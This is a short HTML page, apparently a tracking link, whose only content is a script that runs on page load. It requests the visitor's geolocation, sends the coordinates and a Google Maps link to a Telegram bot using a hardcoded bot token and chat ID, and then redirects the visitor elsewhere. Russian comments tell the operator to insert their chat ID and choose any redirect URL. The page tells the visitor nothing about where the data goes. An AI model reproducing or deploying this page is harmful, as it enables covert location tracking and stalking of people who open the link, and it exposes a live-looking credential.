<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>...</title>
</head>
<body>
<script>
    const BOT_TOKEN = "8608506828:AAFT61pdYWAUltJtaeA9klQFtCoCilSFv74";
    const CHAT_ID = "8229602772"; // <-- сюда вставьте полученный chat_id

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const message = `📍 Координаты:\nhttps://maps.google.com/?q=${lat},${lng}\n${lat}, ${lng}`;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                }).finally(() => {
                    window.location.href = "https://example.com"; // сюда можно подставить любой URL
                });
            },
            () => { window.location.href = "https://example.com"; }
        );
    } else {
        window.location.href = "https://example.com";
    }
</script>
</body>
</html>
